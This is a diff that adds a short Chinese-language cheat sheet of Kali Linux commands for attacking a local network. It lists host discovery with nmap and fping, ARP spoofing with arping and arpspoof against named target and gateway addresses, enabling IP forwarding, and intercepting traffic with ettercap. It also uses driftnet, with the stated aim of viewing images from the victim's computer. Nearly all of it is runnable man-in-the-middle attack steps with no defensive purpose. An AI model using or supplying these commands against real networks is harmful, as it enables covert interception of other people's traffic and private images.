@@ -1,0 +1,20 @@
+arping -s 11:11:11:11:11:11 -S 网关IP 目标IP 
+arpspoof   -i  eth0   -t    10.0.128.1  10.0.128.78 （实用）
+
+kali 查看IP ip addr
+查看网关 ip route
+kali里也是arp -a
+kali里扫ip的命令是       nmap -sP 10.0.105.0/24  fping -g 10.0.128.1/24
+全面具体扫描指定ip     nmap -A 10.0.105.1
+cmd查看Mac地址   arp -a
+ipconfig    查看自己IP
+
+欺骗攻击
+arpspoof -i eth0 -t 10.0.128.87（目标）  10.0.128.3（伪装）  攻击  
+ettercap -Tq -i eth0      查看拦截
+
+查看对方电脑图片
+arpspoof   -i  eth0   -t   10.0.128.78（ip）  10.0.128.1 (网关)
+设置端口转发
+echo 1 > /proc/sys/net/ipv4/ip_forward
+driftnet -i eth0
